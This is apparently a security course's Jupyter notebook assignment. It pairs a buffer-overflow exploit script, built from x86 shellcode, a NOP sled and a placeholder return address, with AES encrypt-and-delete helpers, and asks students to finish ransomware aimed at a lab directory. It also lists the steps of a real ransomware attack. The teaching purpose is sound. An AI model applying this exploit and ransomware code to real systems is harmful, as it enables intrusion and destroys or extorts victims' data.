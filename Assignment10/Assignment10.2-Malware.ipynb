{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Malware\n",
    "\n",
    "In this notebook, we're going to use our exploit to perform a malware attack. You will write the malware yourself (with some guidance). The main idea here is that you start to imagine what an adversary can accomplish after hijacking control flow.\n",
    "\n",
    "First, we need to hijack control flow. The Python code in \"payload.py\" includes some new shellcode. Otherwise, it looks exactly like \"exploitmenop.py\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/python\n",
    "  \n",
    "from struct import pack\n",
    "\n",
    "new_ra=pack(\"<I\",0xaabbccdd) # FIX ME\n",
    "overflow=b\"A\"*10             # FIX ME\n",
    "\n",
    "shellcode=b'\\x31\\xc0\\x50\\x68\\x65\\x2e\\x70\\x79\\x68\\x6c\\x77\\x61\\x72\\x68\\x2e\\x2f\\x6d\\x61\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\n",
    "\n",
    "nopsled=\"\\x90\"*128\n",
    "\n",
    "payload=overflow+new_ra+nopsled+shellcode\n",
    "\n",
    "print(payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To get this exploit working, you'll once again need to point new_ra to the correct address and make sure to overflow with the correct number of characters. There's no need to recompute those values. You should be able to just copy your answers from \"exploitmenop.py\". If this exploit works, you should be able to run these commands:\n",
    "\n",
    "./payload.py > input.txt  \n",
    "./exploitme < input.txt\n",
    "\n",
    "If everything is working, you should see the following output:\n",
    "\n",
    "MALWARE EXECUTED"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing Malware\n",
    "\n",
    "Where did that message come from? Look in the file \"malware.py\". In addition to some extra stuff, you should see the following code at the bottom:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def main():\n",
    "    print(\"MALWARE EXECUTED\")\n",
    "\n",
    "main()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The shellcode in \"payload.py\" runs this script! If you'd like to prove that to yourself, you could change the message \"malware.py\" prints and rerun your exploit to see the new output.\n",
    "\n",
    "You're going to write some malware in this Python file. Specifically, you're going to write a ransomware attack (well, most of an attack.) The directory \"ransomme\" has some text files in it. You will encrypt all of those files and then delete the originals (be careful about what you delete!)\n",
    "\n",
    "I've already gotten you started with a few functions. fileList is a function that takes a path to a directory. It returns a list of files. Here's a demonstration of what it can do:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "def fileList(directory):\n",
    "    rv=[]\n",
    "    for fname in os.listdir(directory):\n",
    "        rv.append(os.path.join(directory,fname))\n",
    "    return rv\n",
    "\n",
    "for file in fileList(\"./ransomme\"):\n",
    "    print(file)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As you can see, you can use \"fileList\" to get the names of all of the files in ransomme.\n",
    "\n",
    "The function encryptFile takes a key (a 16 letter string) and the name of a file and creates an encrypted version of the file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, random, struct\n",
    "from Crypto.Cipher import AES\n",
    "\n",
    "def encryptFile(key,filename):\n",
    "    chunksize=64*1024\n",
    "    outfilename=filename+\".enc\"\n",
    "    iv=os.urandom(16)\n",
    "    encryptor=AES.new(key, AES.MODE_CBC, iv)\n",
    "    filesize=os.path.getsize(filename)\n",
    "\n",
    "    with open(filename, 'rb') as infile:\n",
    "        with open(outfilename, 'wb') as outfile:\n",
    "            outfile.write(struct.pack('<Q', filesize))\n",
    "            outfile.write(iv)\n",
    "\n",
    "            while True:\n",
    "                chunk = infile.read(chunksize)\n",
    "                if len(chunk) == 0:\n",
    "                    break\n",
    "                elif len(chunk) % 16 != 0:\n",
    "                    chunk += b' ' * (16 - len(chunk) % 16)\n",
    "                outfile.write(encryptor.encrypt(chunk))\n",
    "                \n",
    "encryptFile(\"ABCDEFGHIJKLMNOP\",\"exploitme.c\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you look in your Assignment10 directory, you should see a file named \"exploitme.c.enc\" that contains the encrypted version of this file."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally, we have \"deleteFile\". **BE CAREFUL** with this function. It deletes a file. Once you run it, I can't help you get the file back. I'll use it here to get rid of the encrypted file \"exploitme.c.enc\" that we just created."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def deleteFile(fname):\n",
    "    os.remove(fname)\n",
    "    \n",
    "deleteFile(\"exploitme.c.enc\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you check your Assignment10 directory now, you should see that exploitme.c.enc is gone."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercises\n",
    "\n",
    "Wait... exercises already? Yes! Your *one and only exercise* is to write the ransomware. I'll be available to answer your questions, but this is your show. You should rewrite \"main\" in \"malware.py\" so it loops through all the files in ransomme, encrypts them, and then deletes the originals. You should make your own key string, so only you can decrypt the files.\n",
    "\n",
    "This is it! Your chance to be truly evil! Good luck!\n",
    "\n",
    "**TIP:** You can create a test copy of the \"ransomme\" directory with this command:\n",
    "\n",
    "cp -r ransomme testcopy\n",
    "\n",
    "You can develop and test your exploit by targeting the \"testcopy\" directory first. Once it's working, then you can target \"ransomme\".\n",
    "\n",
    "**NOTE:** This isn't the entire ransomware attack. A real adversary would need to take a few more steps. They'd need to:\n",
    "\n",
    "1) Securely transmit the key to themselves over the internet, so they'd know how to decrypt the files.\n",
    "\n",
    "2) Delete the \"malware.py\" script, to prevent the victim from retrieving the encryption key.\n",
    "\n",
    "3) Notify the victim that their files were encrypted and how to make a payment.\n",
    "\n",
    "4) Set up a cryptocurrency wallet to receive payment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
